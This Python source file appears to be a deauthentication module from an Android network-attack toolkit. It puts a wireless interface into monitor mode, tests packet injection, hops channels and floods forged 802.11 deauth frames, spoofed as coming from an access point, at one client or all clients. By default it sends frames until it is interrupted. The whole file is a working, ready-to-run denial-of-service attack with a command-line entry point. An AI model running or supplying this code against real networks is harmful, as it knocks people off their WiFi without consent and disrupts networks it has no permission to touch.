"""
802.11 Deauthentication Module.

Sends forged Deauth frames (type 0xC0) to a specific client or to all
clients on an AP (broadcast), forcing WiFi disconnection.

Android limitation:
    Most integrated Android WiFi chips do NOT support monitor mode or
    packet injection. Recommended alternatives:
        · Alfa AWUS036ACH via OTG
        · Run from Raspberry Pi or Kali PC
        · ESP8266 with Deauther firmware (standalone)

WPA3 note:
    WPA3 implements Management Frame Protection (MFP/802.11w). This
    attack does NOT work against WPA3 networks with MFP active.

Requires:
    pip install scapy
"""

import re
import shutil
import subprocess
import sys
import threading
import time
from typing import TYPE_CHECKING

from rich import print as rprint

from droidnet.core.logger import get_logger
from droidnet.platform.utils import check_root

# Non-overlapping 2.4 GHz channels (the most used). For a full hop
# add 2-13, but it slows down effective injection significantly.
_DEFAULT_HOP_CHANNELS = (1, 6, 11)
_DEFAULT_HOP_INTERVAL = 0.5  # seconds per channel

# Scapy may be unavailable on Android — handle gracefully at import time
try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    _SCAPY_OK = True
except ImportError:
    _SCAPY_OK = False

if TYPE_CHECKING:
    from scapy.packet import Packet

BROADCAST = "ff:ff:ff:ff:ff:ff"

log = get_logger(__name__)

_MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")


def _valid_mac(mac: str) -> bool:
    """True if *mac* is a well-formed colon-separated 48-bit MAC address."""
    return bool(_MAC_RE.match(mac))


def _check_monitor_mode(iface: str) -> bool:
    """
    Return True if *iface* is in monitor mode.

    Reads /sys/class/net/<iface>/type (803 = IEEE 802.11 monitor).
    More reliable than parsing iwconfig text output.
    """
    try:
        with open(f"/sys/class/net/{iface}/type") as fh:
            return fh.read().strip() == "803"
    except Exception:
        return False


def _enable_monitor(iface: str) -> bool:
    """
    Attempt to put *iface* into monitor mode using ip + iw.

    Returns True if successful, False if the chip does not support it.
    """
    rprint(f"[yellow][!][/yellow] Attempting to activate monitor mode on {iface}...")
    subprocess.run(["ip", "link", "set", iface, "down"],            capture_output=True)
    subprocess.run(["iw", "dev", iface, "set", "type", "monitor"],  capture_output=True)
    subprocess.run(["ip", "link", "set", iface, "up"],              capture_output=True)
    time.sleep(1)
    return _check_monitor_mode(iface)


def _disable_monitor(iface: str) -> None:
    """Restore *iface* to managed mode. Best-effort, swallows errors."""
    rprint(f"[dim][·] Restoring {iface} to managed mode...[/dim]")
    subprocess.run(["ip", "link", "set", iface, "down"],            capture_output=True)
    subprocess.run(["iw", "dev", iface, "set", "type", "managed"],  capture_output=True)
    subprocess.run(["ip", "link", "set", iface, "up"],              capture_output=True)


def _injection_supported(iface: str) -> bool | None:
    """
    Verifies if the chipset injects 802.11 packets.

    Strategy:
        1. If aireplay-ng is in PATH → `aireplay-ng --test <iface>` and
           look for "Injection is working" in the output.
        2. If not found → returns None (we cannot check it, do not
           block the user).
    """
    if not shutil.which("aireplay-ng"):
        return None
    try:
        proc = subprocess.run(
            ["aireplay-ng", "--test", iface],
            capture_output=True, text=True, timeout=12,
        )
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return None
    output = (proc.stdout or "") + (proc.stderr or "")
    return "Injection is working" in output


def _set_channel(iface: str, channel: int) -> bool:
    """`iw dev <iface> set channel <ch>`. True if retcode == 0."""
    proc = subprocess.run(
        ["iw", "dev", iface, "set", "channel", str(channel)],
        capture_output=True,
    )
    return proc.returncode == 0


class _ChannelHopper:
    """
    Background thread that rotates the channel of the interface in monitor mode.

    Useful when the AP channel is unknown or when attacking multiple APs
    (broadcast). Stop by calling stop().
    """
    def __init__(
        self,
        iface: str,
        channels: tuple[int, ...] = _DEFAULT_HOP_CHANNELS,
        interval: float = _DEFAULT_HOP_INTERVAL,
    ) -> None:
        self.iface    = iface
        self.channels = channels
        self.interval = interval
        self._stop    = threading.Event()
        self._thread: threading.Thread | None = None

    def start(self) -> None:
        if self._thread:
            return
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=2)

    def _loop(self) -> None:
        i = 0
        while not self._stop.is_set():
            _set_channel(self.iface, self.channels[i % len(self.channels)])
            i += 1
            self._stop.wait(self.interval)


def _build_deauth(target_mac: str, bssid: str, reason: int = 7) -> "Packet":
    """
    Build the 802.11 Deauth Scapy frame.

    Frame structure:
        RadioTap / Dot11(addr1=target, addr2=bssid, addr3=bssid) / Dot11Deauth(reason)

    reason=7 ("Class 3 frame from unassociated STA") is the most
    common code used by legitimate APs and audit tools.
    """
    return (
        RadioTap() /
        Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) /
        Dot11Deauth(reason=reason)
    )


def deauth_target(
    target_mac: str,
    bssid: str,
    iface: str,
    count: int = 0,
    interval: float = 0.1,
    channel: int | None = None,
) -> None:
    """
    Orchestrate the full deauthentication attack.

    Args:
        target_mac : Client MAC to disconnect, or BROADCAST for all clients.
        bssid      : AP BSSID (used as the spoofed frame source).
        iface      : Interface in monitor mode (e.g. wlan0mon).
        count      : Frames to send; 0 = infinite until Ctrl+C.
        interval   : Seconds between frames (default 0.1 s = 10 fps).
        channel    : 802.11 channel of the AP. If None, channel hopping is
                     performed in bg over 1/6/11.
    """
    if not _SCAPY_OK:
        rprint("[red][✗] Scapy not installed. pip install scapy[/red]")
        return

    if not check_root():
        rprint("[red][✗] Root required.[/red]")
        return

    if not _valid_mac(bssid):
        rprint(f"[red][✗] Invalid BSSID: {bssid}[/red]")
        return
    if target_mac != BROADCAST and not _valid_mac(target_mac):
        rprint(f"[red][✗] Invalid target MAC: {target_mac}[/red]")
        return

    we_enabled_monitor = False
    if not _check_monitor_mode(iface):
        rprint(f"[yellow][!][/yellow] {iface} is not in monitor mode.")
        if not _enable_monitor(iface):
            rprint(f"[bold red][✗] Could not enable monitor mode on {iface}.[/bold red]")
            rprint("[dim]On Android: your WiFi chip probably does not support this.\n"
                   "Workaround: Alfa AWUS036ACH over OTG, or run from a RPi/Kali.[/dim]")
            return
        we_enabled_monitor = True

    # Injection test — only if we have aireplay-ng. Otherwise, we continue.
    injection = _injection_supported(iface)
    if injection is False:
        rprint("[bold red][✗] The chipset does NOT support packet injection.[/bold red]")
        rprint("[dim]aireplay-ng --test reported failure. Switch WiFi adapter.[/dim]")
        if we_enabled_monitor:
            _disable_monitor(iface)
        return
    if injection is True:
        rprint("[green][✓][/green] Injection verified with aireplay-ng.")
    else:
        rprint("[dim][·] aireplay-ng not installed; skipping injection test.[/dim]")

    # Channel hopping if no explicit channel is specified.
    hopper: _ChannelHopper | None = None
    if channel is not None:
        if _set_channel(iface, channel):
            rprint(f"[dim][·] Channel set to {channel}.[/dim]")
        else:
            rprint(f"[yellow][!][/yellow] Could not set channel {channel}; trying anyway.")
    else:
        rprint(f"[dim][·] Channel hopping {_DEFAULT_HOP_CHANNELS} every "
               f"{_DEFAULT_HOP_INTERVAL}s.[/dim]")
        hopper = _ChannelHopper(iface)
        hopper.start()

    frame          = _build_deauth(target_mac, bssid)
    target_display = "BROADCAST (all)" if target_mac == BROADCAST else target_mac

    log.info("deauth started target=%s bssid=%s iface=%s", target_display, bssid, iface)
    rprint("\n[bold red][☠][/bold red] Deauth started")
    rprint(f"  Target    : [cyan]{target_display}[/cyan]")
    rprint(f"  AP (BSSID): [cyan]{bssid}[/cyan]")
    rprint(f"  Interface : [cyan]{iface}[/cyan]")
    rprint("  Ctrl+C to stop.\n")

    sent = 0
    try:
        while count == 0 or sent < count:
            # sendp(inter=) only spaces packets within a single call, so pace
            # the per-frame sends here instead.
            sendp(frame, iface=iface, verbose=False)
            sent += 1
            rprint(f"  [dim][→] Frames sent: {sent}[/dim]", end="\r")
            time.sleep(interval)
    except KeyboardInterrupt:
        rprint(f"\n[bold yellow][!][/bold yellow] Stopped. {sent} frames total.")
    finally:
        if hopper:
            hopper.stop()
        if we_enabled_monitor:
            _disable_monitor(iface)


if __name__ == "__main__":
    if len(sys.argv) < 4:
        rprint("[yellow]Usage: python -m droidnet.modules.deauther <MAC|broadcast> <BSSID> <IFACE>[/yellow]")
        sys.exit(1)

    _target = BROADCAST if sys.argv[1].lower() == "broadcast" else sys.argv[1]
    deauth_target(_target, sys.argv[2], sys.argv[3])
